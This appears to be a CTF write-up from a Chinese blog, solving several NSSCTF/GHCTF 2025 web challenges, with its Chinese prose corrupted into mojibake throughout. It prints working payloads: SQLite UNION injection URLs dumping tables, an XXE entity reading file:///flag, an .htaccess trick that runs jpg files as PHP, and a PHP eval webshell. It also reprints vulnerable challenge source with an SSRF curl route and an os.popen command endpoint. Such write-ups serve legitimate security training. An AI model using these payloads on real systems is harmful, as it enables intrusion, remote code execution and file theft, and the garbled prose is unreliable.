<p><a target="_blank" rel="noopener" href="https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html#">é¢˜ç›®+ç­”æ¡ˆ+2023å¹´å…¨å›½èŒä¸šé™¢æ ¡æŠ€èƒ½å¤§èµ›ä¿¡æ¯å®‰å…¨ç®¡ç†ä¸è¯„ä¼°çœŸé¢˜ - JunBlog</a></p>
<p>æƒ³åˆ°å¯èƒ½æ˜¯æ•°æ®åº“çš„ä¸åŒ</p>
<p>è½¬æ¢æ€æƒ³ï¼Œå°è¯•ç”¨æ¯ä¸ªsqlæ•°æ®åº“çš„ä¸åŒsqlè¯­å¥å°è¯•</p>
<p>æŸ¥çœ‹å›æ˜¾ä½</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,2,3,4,5
</code></pre>
<p><img src="1741586509126-34dfe6cf-c494-40cf-9752-226c7b0c05b1.png" loading="lazy"></p>
<p>æœä¸å…¶ç„¶ï¼Œé€šè¿‡sqlite_version()å‡½æ•°ç¡®è®¤äº†æ•°æ®åº“</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,sqlite_version(),3,4,5
</code></pre>
<p><img src="1741586610138-4b83d176-ae74-44a3-9966-92059725410f.png" loading="lazy"></p>
<p>è¿™é‡Œæ¨èä¸€ç¯‡è®²sqliteæ³¨å…¥çš„æ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8220?time__1311=YqUxg7DQi=30HRx+hDArUtGOY8Dt88T4D&u_atoken=eb5b96e94d51cbebed2d598991a308cc&u_asig=0a472f9017415793738783147e00df">https://xz.aliyun.com/news/8220?time__1311&#x3D;YqUxg7DQi%3D30HRx%2BhDArUtGOY8Dt88T4D&amp;u_atoken&#x3D;eb5b96e94d51cbebed2d598991a308cc&amp;u_asig&#x3D;0a472f9017415793738783147e00df</a></p>
<p>ä½¿ç”¨<strong>sql from sqlite_master</strong>æŸ¥çœ‹è¡¨å</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,sqlite_version(),3,4,sql from sqlite_master
</code></pre>
<p><img src="1741587015088-79d885dd-90b2-429d-b323-72b3d7839c41.png" loading="lazy"></p>
<p>å¯ä»¥çœ‹åˆ°å­˜åœ¨flagè¡¨</p>
<p>é‚£å°±ç›´æ¥æŸ¥çœ‹flag</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,2,3,4,group_concat(flag) from flag
</code></pre>
<p><img src="1741587325602-32b5b38d-cd11-4003-8760-ed88515981df.png" loading="lazy"></p>
<h1 id="GHCTF-2025-ï¹"><a href="#GHCTF-2025-ï¹" class="headerlink" title="[GHCTF 2025] (&gt;ï¹&lt;)"></a>[GHCTF 2025] (&gt;ï¹&lt;)</h1><h2 id="é¢˜ç›®é“¾æ¥"><a href="#é¢˜ç›®é“¾æ¥" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6578">https://www.nssctf.cn/problem/6578</a></p>
<h2 id="é¢˜è§£-wp-1"><a href="#é¢˜è§£-wp-1" class="headerlink" title="é¢˜è§£(wp)"></a>é¢˜è§£(wp)</h2><p>æ‰“å¼€é¢˜ç›®å‘ç°è¿”å›äº†æºç ï¼ˆç¼©è¿›å‘¢ï¼ï¼ï¼ğŸ–•ğŸ–•ğŸ–•ğŸ–•ï¼‰</p>
<p><img src="1741587514129-5919571f-b00f-4527-9055-2497d4e10be3.png" loading="lazy"></p>
<p>å°è¯•æ¢å¤ç¼©è¿›</p>
<pre><code class="language-python">from flask import Flask, request
import base64
from lxml import etree
import re

app = Flask(__name__)

@app.route(&#39;/&#39;)
def index():
    return open(__file__).read()

@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])
def parse():
    xml = request.form.get(&#39;xml&#39;)
    print(xml)
    if xml is None:
        return &quot;No System is Safe.&quot;
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find(&#39;name&#39;).text
    return name or None

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;, port=8080)
</code></pre>
<p>åœ¨ä»£ç ä¸­å¯¼å…¥äº†Flaskã€requestã€base64ã€lxml.etreeå’Œreæ¨¡å—ã€‚ç„¶ååˆ›å»ºäº†ä¸€ä¸ªFlaskåº”ç”¨å®ä¾‹</p>
<pre><code class="language-python">app = Flask(__name__)
</code></pre>
<p>å®šä¹‰äº†ä¸¤ä¸ªè·¯ç”±ï¼šæ ¹è·¯å¾„â€™&#x2F;â€˜å’Œâ€™&#x2F;ghctfâ€™çš„POSTè¯·æ±‚å¤„ç†å‡½æ•°ã€‚</p>
<pre><code class="language-python">@app.route(&#39;/&#39;)
</code></pre>
<pre><code class="language-python">@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])
</code></pre>
<p>æ¥ä¸‹æ¥çœ‹åˆ°å¤„ç†â€™&#x2F;ghctfâ€™çš„POSTçš„å‡½æ•°<strong>parse()</strong></p>
<pre><code class="language-python">@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])
def parse():
    xml = request.form.get(&#39;xml&#39;)
    print(xml)
    if xml is None:
        return &quot;No System is Safe.&quot;
</code></pre>
<p>å®ƒä»è¯·æ±‚è¡¨å•ä¸­è·å–åä¸ºâ€™xmlâ€™çš„å‚æ•°ï¼Œç„¶åæ‰“å°å‡ºæ¥ã€‚å¦‚æœæ²¡æœ‰æä¾›xmlå‚æ•°ï¼Œå°±è¿”å›â€No System is Safe.â€</p>
<p>æ¥ç€ä½¿ç”¨etree.XMLParseré…ç½®è§£æå™¨ï¼Œå…è®¸åŠ è½½DTDå¹¶è§£æå®ä½“ã€‚ç„¶åå°è¯•è§£æä¼ å…¥çš„xmlå­—ç¬¦ä¸²ï¼Œå¹¶æå–<name>æ ‡ç­¾çš„æ–‡æœ¬å†…å®¹è¿”å›ã€‚</name></p>
<pre><code class="language-python">parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find(&#39;name&#39;).text
    return name or None
</code></pre>
<p>å› ä¸ºè§£æå™¨å¯ç”¨äº†resolve_entities&#x3D;Trueï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘æ¨æ–­å­˜åœ¨xxeï¼ˆ<font style="color:rgb(139, 139, 139);">XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXXEï¼‰æ¼æ´</font>ï¼‰</p>
<p>æ„å»ºxmlå¼•ç”¨file:&#x2F;&#x2F;&#x2F;flag</p>
<pre><code class="language-xml">&lt;!DOCTYPE foo [
&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;
]&gt;
&lt;root&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;
</code></pre>
<p>å°†xmlè¿›è¡Œurlç¼–ç </p>
<p>å¹¶ä½¿ç”¨POSTå‘åŒ…</p>
<pre><code class="language-python">xml=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///flag%22%3E]%3E%3Croot%3E%3Cname%3E%26xxe;%3C/name%3E%3C/root%3E
</code></pre>
<p><img src="1741593612324-6d211200-2105-4c0a-a452-0b5d78c34e7e.png" loading="lazy"></p>
<p>flag</p>
<p><font style="color:rgb(0, 0, 0);">NSSCTF{e6a0765a-7b69-4b91-b17b-103f97cf97f8}</font></p>
<h1 id="GHCTF-2025-UPUPUP"><a href="#GHCTF-2025-UPUPUP" class="headerlink" title="[GHCTF 2025]UPUPUP"></a>[GHCTF 2025]UPUPUP</h1><h2 id="é¢˜ç›®é“¾æ¥-1"><a href="#é¢˜ç›®é“¾æ¥-1" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6590">https://www.nssctf.cn/problem/6590</a></p>
<h2 id="é¢˜è§£-wp-2"><a href="#é¢˜è§£-wp-2" class="headerlink" title="é¢˜è§£(wp)"></a>é¢˜è§£(wp)</h2><p>æ‰“å¼€é¢˜ç›®</p>
<p><img src="1741594739679-a184e752-6193-4937-8d0f-b06d0bb3ee6c.png" loading="lazy"></p>
<p>æ–‡ä»¶ä¸Šä¼ é¢˜ç›®</p>
<p>å°è¯•ä¸Šä¼ phpinfo()</p>
<p><img src="1741594938128-f1d8005c-aa70-4e20-a0ad-4e9b7d1491d1.png" loading="lazy"></p>
<p><img src="1741594986679-5a81e84d-4c14-480b-a567-240b7e44a1cb.png" loading="lazy"></p>
<p>çœ‹æ¥æ˜¯å¯¹æ–‡ä»¶å†…å®¹æœ‰è¿‡æ»¤</p>
<p>æ¢ä¸€ç§</p>
<p>ç›´æ¥åœ¨å›¾ç‰‡æœ«å°¾åŠ ä¸Š<?php phpinfo(); ?></p>
<p><img src="1741595246431-d21b9db9-b0cc-428e-b902-59ea588ae127.png" loading="lazy"></p>
<p>ä¸Šä¼ </p>
<p><img src="1741595269700-75fd21a0-1f53-40fb-94fa-e8ba8632ec99.png" loading="lazy"></p>
<p>ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯å´æ˜¯ä»¥jpgç»“å°¾çš„ï¼ˆphpç»“å°¾çš„ä¼šè¢«è¿‡æ»¤ï¼‰ï¼Œæ— æ³•è§£æ</p>
<p>æƒ³åˆ°apacheæœåŠ¡å™¨çš„ä¸Šä¼ <font style="color:rgb(38,38,38);">.htaccessæ–‡ä»¶è¿›è¡Œè§£æç»•è¿‡</font></p>
<p><img src="1741595417742-6d21483b-044d-437a-bbf0-6c6d8ca641a7.png" loading="lazy"></p>
<p><img src="1741595430137-b14a9e42-394d-4131-ab78-32de2023d71b.png" loading="lazy"></p>
<p>ğŸ˜•</p>
<p>æƒ³åˆ°äº†æ–‡ä»¶å¤´ç»•è¿‡</p>
<p><font style="color:rgb(38,38,38);">ä½†å¦‚æœç›´æ¥åœ¨ .htaccess å¼€å¤´åŠ â¼Š GIF89A çš„è¯è®¿é—®æ•´ä¸ª images â½¬å½•ä¸‹çš„â½‚ä»¶éƒ½ä¼šçˆ† </font></p>
<p><font style="color:rgb(38,38,38);">500, ä¼šå‡ºç°è¯­æ³•é”™è¯¯</font></p>
<p><font style="color:rgb(38,38,38);">.htaccess é€šè¿‡ # æ¥æ³¨é‡Š, åæ¥äº†è§£åˆ°è¿˜æœ‰ \x00</font></p>
<pre><code class="language-python">#define width 1
#define height 1
&lt;FilesMatch &quot;jpg&quot;&gt;
  SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p><img src="1741596107226-488edb76-afd1-46d8-8366-43bf5ae412a2.png" loading="lazy"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p><img src="1741596131525-61d9314a-cb11-41d1-95dd-fa2a74701273.png" loading="lazy"></p>
<p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<p>hey.hey</p>
<pre><code class="language-php">#define width 1
#define height 1
&lt;?php
  eval($_POST[&quot;anro&quot;]);
?&gt;
</code></pre>
<p><img src="1741596603705-69f2f4b9-cf95-4184-8f5f-b5dd2d351fb6.png" loading="lazy"></p>
<p><img src="1741596646329-3e9e4b9f-f486-4ef3-a975-c0e9b903b696.png" loading="lazy"></p>
<h1 id="GHCTF-2025-Goph3rrr"><a href="#GHCTF-2025-Goph3rrr" class="headerlink" title="[GHCTF 2025]Goph3rrr"></a>[GHCTF 2025]Goph3rrr</h1><h2 id="é¢˜ç›®é“¾æ¥-2"><a href="#é¢˜ç›®é“¾æ¥-2" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6582">https://www.nssctf.cn/problem/6582</a></p>
<h2 id="é¢˜è§£ï¼ˆwpï¼‰"><a href="#é¢˜è§£ï¼ˆwpï¼‰" class="headerlink" title="é¢˜è§£ï¼ˆwpï¼‰"></a>é¢˜è§£ï¼ˆwpï¼‰</h2><p><img src="1741603959131-15504d0f-710d-4cdb-9a4a-f7456950bda4.png" loading="lazy"></p>
<p>æ‰“å¼€é¢˜ç›®</p>
<p>çœ‹çœ‹å‰ç«¯æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p><img src="1741604022435-480e1814-42c5-4f78-b33a-653ef74fc1b3.png" loading="lazy"></p>
<p>ä»€ä¹ˆéƒ½æ²¡æ‰¾åˆ°</p>
<p>ä½¿ç”¨dirsearch è¿›è¡Œç›®å½•æ‰«æ</p>
<p><img src="1741605001752-56e85db7-14ec-4630-898d-58684a110edd.png" loading="lazy"></p>
<p><img src="1741605028946-a85e4977-3b8c-4ba8-9643-326538f0206f.png" loading="lazy"></p>
<p>æ‰“å¼€æºç </p>
<pre><code class="language-python">from flask import Flask, request, send_file, render_template_string
import os
from urllib.parse import urlparse, urlunparse
import subprocess
import socket
import hashlib
import base64
import random

app = Flask(__name__)
BlackList = [
    &quot;127.0.0.1&quot;
]

@app.route(&#39;/&#39;)
def index():
    return &#39;&#39;&#39;
    &lt;html&gt;
        &lt;head&gt;
            &lt;style&gt;
                body &#123;
                    background-size: cover; /* èƒŒæ™¯å›¾ç‰‡è¦†ç›–æ•´ä¸ªé¡µé¢ */
                    height: 100vh; /* é¡µé¢é«˜åº¦å¡«æ»¡æµè§ˆå™¨çª—å£ */
                    display: flex;
                    justify-content: center; /* æ°´å¹³å±…ä¸­ */
                    align-items: center; /* å‚ç›´å±…ä¸­ */
                    color: white; /* å­—ä½“é¢œè‰² */
                    font-family: Arial, sans-serif; /* å­—ä½“ */
                    text-align: center; /* æ–‡å­—å±…ä¸­ */
                &#125;
                h1 &#123;
                    font-size: 50px;
                    transition: transform 0.2s ease-in-out; /* è®¾ç½®æµ®åŠ¨æ•ˆæœè¿‡æ¸¡æ—¶é—´ */
                &#125;
                h1:hover &#123;
                    transform: translateY(-10px); /* å‘ä¸Šæµ®åŠ¨ */
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;Hello Ctfer!!! Welcome to the GHCTF challenge! (â‰§âˆ‡â‰¦)&lt;/h1&gt;
        &lt;/body&gt;
    &lt;/html&gt;
    &#39;&#39;&#39;

@app.route(&#39;/Login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    junk_code()
    if request.method == &#39;POST&#39;:
        username = request.form.get(&#39;username&#39;)
        password = request.form.get(&#39;password&#39;)
        if username in users and users[username][&#39;password&#39;] == hashlib.md5(password.encode()).hexdigest():
            return b64e(f&quot;Welcome back, &#123;username&#125;!&quot;)
        return b64e(&quot;Invalid credentials!&quot;)
    return render_template_string(&quot;&quot;&quot;
        &lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;en&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;Login&lt;/title&gt;
            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
            &lt;style&gt;
                body &#123;
                    background-color: #f8f9fa;
                &#125;
                .container &#123;
                    max-width: 400px;
                    margin-top: 100px;
                &#125;
                .card &#123;
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                &#125;
                .card-header &#123;
                    background-color: #007bff;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                &#125;
                .btn-primary &#123;
                    background-color: #007bff;
                    border: none;
                &#125;
                .btn-primary:hover &#123;
                    background-color: #0056b3;
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;card&quot;&gt;
                    &lt;div class=&quot;card-header&quot;&gt;
                        &lt;h3&gt;Login&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;card-body&quot;&gt;
                        &lt;form method=&quot;POST&quot;&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;
                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
                            &lt;/div&gt;
                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;Login&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    &quot;&quot;&quot;)

@app.route(&#39;/Gopher&#39;)
def visit():
    url = request.args.get(&#39;url&#39;)
    if url is None:
        return &quot;No url provided :)&quot;
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == &quot;file&quot; or realIpAddress in BlackList:
        return &quot;No (â‰§âˆ‡â‰¦)&quot;
    result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)
    return result.stdout

@app.route(&#39;/RRegister&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    junk_code()
    if request.method == &#39;POST&#39;:
        username = request.form.get(&#39;username&#39;)
        password = request.form.get(&#39;password&#39;)
        if username in users:
            return b64e(&quot;Username already exists!&quot;)
        users[username] = &#123;&#39;password&#39;: hashlib.md5(password.encode()).hexdigest()&#125;
        return b64e(&quot;Registration successful!&quot;)
    return render_template_string(&quot;&quot;&quot;
        &lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;en&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;Register&lt;/title&gt;
            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
            &lt;style&gt;
                body &#123;
                    background-color: #f8f9fa;
                &#125;
                .container &#123;
                    max-width: 400px;
                    margin-top: 100px;
                &#125;
                .card &#123;
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                &#125;
                .card-header &#123;
                    background-color: #28a745;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                &#125;
                .btn-success &#123;
                    background-color: #28a745;
                    border: none;
                &#125;
                .btn-success:hover &#123;
                    background-color: #218838;
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;card&quot;&gt;
                    &lt;div class=&quot;card-header&quot;&gt;
                        &lt;h3&gt;Register&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;card-body&quot;&gt;
                        &lt;form method=&quot;POST&quot;&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;
                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
                            &lt;/div&gt;
                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-success w-100&quot;&gt;Register&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    &quot;&quot;&quot;)

@app.route(&#39;/Manage&#39;, methods=[&#39;POST&#39;])
def cmd():
    if request.remote_addr != &quot;127.0.0.1&quot;:
        return &quot;Forbidden!!!&quot;
    if request.method == &quot;GET&quot;:
        return &quot;Allowed!!!&quot;
    if request.method == &quot;POST&quot;:
        return os.popen(request.form.get(&quot;cmd&quot;)).read()

@app.route(&#39;/Upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_avatar():
    junk_code()
    if request.method == &#39;POST&#39;:
        username = request.form.get(&#39;username&#39;)
        if username not in users:
            return b64e(&quot;User not found!&quot;)
        file = request.files.get(&#39;avatar&#39;)
        if file:
            file.save(os.path.join(avatar_dir, f&quot;&#123;username&#125;.png&quot;))
            return b64e(&quot;Avatar uploaded successfully!&quot;)
        return b64e(&quot;No file uploaded!&quot;)
    return render_template_string(&quot;&quot;&quot;
        &lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;en&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;Upload Avatar&lt;/title&gt;
            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
            &lt;style&gt;
                body &#123;
                    background-color: #f8f9fa;
                &#125;
                .container &#123;
                    max-width: 400px;
                    margin-top: 100px;
                &#125;
                .card &#123;
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                &#125;
                .card-header &#123;
                    background-color: #dc3545;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                &#125;
                .btn-danger &#123;
                    background-color: #dc3545;
                    border: none;
                &#125;
                .btn-danger:hover &#123;
                    background-color: #c82333;
                &#125;
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;card&quot;&gt;
                    &lt;div class=&quot;card-header&quot;&gt;
                        &lt;h3&gt;Upload Avatar&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;card-body&quot;&gt;
                        &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;
                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
                            &lt;/div&gt;
                            &lt;div class=&quot;mb-3&quot;&gt;
                                &lt;label for=&quot;avatar&quot; class=&quot;form-label&quot;&gt;Avatar&lt;/label&gt;
                                &lt;input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatar&quot; name=&quot;avatar&quot; required&gt;
                            &lt;/div&gt;
                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger w-100&quot;&gt;Upload&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    &quot;&quot;&quot;)


@app.route(&#39;/app.py&#39;)
def download_source():
    return send_file(__file__, as_attachment=True)

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=8000)
</code></pre>
<p>è®²çœŸçš„æ‹¿åˆ°æºç çš„æ—¶å€™ï¼Œæˆ‘çœ‹åˆ°äº†ä¸€é•¿ä¸²çš„å¯†æ–‡è¢«å“åˆ°äº†ï¼Œç„¶åå¾€å‰ç¿»çš„æ—¶å€™æ‰çœ‹åˆ°è¿™æ˜¯èƒŒæ™¯å›¾ç‰‡çš„base64â€¦â€¦..</p>
<p> <strong>åˆ†ææºç </strong></p>
<p>é¦–å…ˆåˆ†æå„ä¸ªè·¯ç”±éƒ½æ˜¯å¹²å˜›çš„</p>
<p><strong>&#x2F;Loginå’Œ&#x2F;RRegisterè·¯ç”±</strong></p>
<p>ç™»å½•å’Œæ³¨å†Œ</p>
<p>å¤„ç†ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œã€‚ç”¨æˆ·å¯†ç ä½¿ç”¨MD5å“ˆå¸Œå­˜å‚¨</p>
<p><strong>&#x2F;Gopher è·¯ç”±å’Œ&#x2F;Manageè·¯ç”±</strong></p>
<p>æ¥æ”¶ä¸€ä¸ªurlå‚æ•°ï¼Œç„¶åä½¿ç”¨curlè®¿é—®è¯¥URL</p>
<p>å¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†SSRFï¼Œéœ€è¦ç»•è¿‡è¿‡æ»¤</p>
<p><font style="color:rgb(139, 139, 139);">- æ£€æŸ¥URLçš„schemeæ˜¯å¦æ˜¯fileï¼Œå¦‚æœæ˜¯åˆ™æ‹’ç»ã€‚</font></p>
<p><font style="color:rgb(139, 139, 139);">- è§£æURLçš„ä¸»æœºåï¼Œè·å–å…¶çœŸå®IPï¼ˆrealIpAddressï¼‰ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦åœ¨é»‘åå•BlackListä¸­ï¼ˆå½“å‰åªæœ‰127.0.0.1ï¼‰ã€‚</font></p>
<p><font style="color:rgb(139, 139, 139);">- å¦‚æœé€šè¿‡æ£€æŸ¥ï¼Œåˆ™ç”¨curlè®¿é—®è¯¥URLï¼Œå¹¶è¿”å›ç»“æœã€‚</font></p>
<pre><code class="language-python">@app.route(&#39;/Gopher&#39;)
def visit():
    url = request.args.get(&#39;url&#39;)
    if url is None:
        return &quot;No url provided :)&quot;
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == &quot;file&quot; or realIpAddress in BlackList:
        return &quot;No (â‰§âˆ‡â‰¦)&quot;
    result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)
    return result.stdout
</code></pre>
<p><strong>&#x2F;Uploadè·¯ç”±</strong></p>
<p>å…è®¸ä¸Šä¼ å¤´åƒï¼Œä¿å­˜ä¸ºPNGæ–‡ä»¶ï¼Œç”±äºæºç é‡‡ç”¨çš„æ˜¯Flaskï¼Œå¯èƒ½ä¸ä¼šæ‰§è¡Œ</p>
<p>åœ¨å¤„ç†ä¸Šä¼ æ–‡ä»¶æ—¶,å¦‚æœç”¨æˆ·ååŒ…å«æ¨¡æ¿æ³¨å…¥çš„payloadï¼Œå¹¶ä¸”æ–‡ä»¶åè¢«æ¸²æŸ“åˆ°æ¨¡æ¿ä¸­ï¼Œå¯èƒ½å¯¼è‡´SSTIã€‚ä½†å½“å‰ä»£ç ä¸­ï¼Œä¸Šä¼ æˆåŠŸåçš„è¿”å›ä¿¡æ¯æ˜¯ç»è¿‡base64ç¼–ç çš„ï¼Œæ²¡æœ‰ä½¿ç”¨æ¨¡æ¿æ¸²æŸ“,æ‰€ä»¥ä¸å¤§å¯èƒ½å­˜åœ¨ssti</p>
<h3 id="åˆ†ææ¼æ´ç‚¹"><a href="#åˆ†ææ¼æ´ç‚¹" class="headerlink" title="åˆ†ææ¼æ´ç‚¹"></a>åˆ†ææ¼æ´ç‚¹</h3><p>ä»æ¯ä¸ªè·¯ç”±çš„ä½œç”¨å’ŒåŠŸèƒ½æ¥çœ‹ï¼Œç›®å‰å°±åªæœ‰ssrfè¿™ä¸€ä¸ªçªç ´ç‚¹ğŸ˜¤</p>
<p>ç°åœ¨å”¯ä¸€å¯èƒ½çš„æ–¹æ³•æ˜¯ä½¿ç”¨Gopheråè®®å‘é€POSTè¯·æ±‚ï¼Œå¹¶ä¸”ç»•è¿‡hostnameçš„æ£€æŸ¥ã€‚</p>
<p>ä¹Ÿå°±æ˜¯æ„é€ ä¸€ä¸ªGopher URLï¼Œå¹¶ä¸”ä¸èƒ½å­˜åœ¨äºé»‘åå•</p>
<p>ä¹Ÿå°±æ˜¯ä¸èƒ½ç­‰äº127.0.0.1</p>
<pre><code class="language-python">app = Flask(__name__)
BlackList = [
    &quot;127.0.0.1&quot;
]
</code></pre>
<p>è¿™é‡Œæˆ‘æä¾›ä¸¤ç§è§£å†³æ–¹æ³•</p>
<h4 id="ç¬¬ä¸€ç§ï¼š"><a href="#ç¬¬ä¸€ç§ï¼š" class="headerlink" title="ç¬¬ä¸€ç§ï¼š"></a>ç¬¬ä¸€ç§ï¼š</h4><p>åˆ©ç”¨DNSé‡ç»‘å®šæ”»å‡»ï¼Œè®©è¯·æ±‚çš„URLä¸åŒ…å«127.0.0.1</p>
<p>è¿™é‡Œæ¨èä¸€ç¯‡å…³äºDNSé‡ç»‘å®šæ”»å‡»çš„æ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36348899/article/details/119297854">https://blog.csdn.net/qq_36348899&#x2F;article&#x2F;details&#x2F;119297854</a></p>
<p>é‡ç»‘å®šçš„ç½‘å€</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
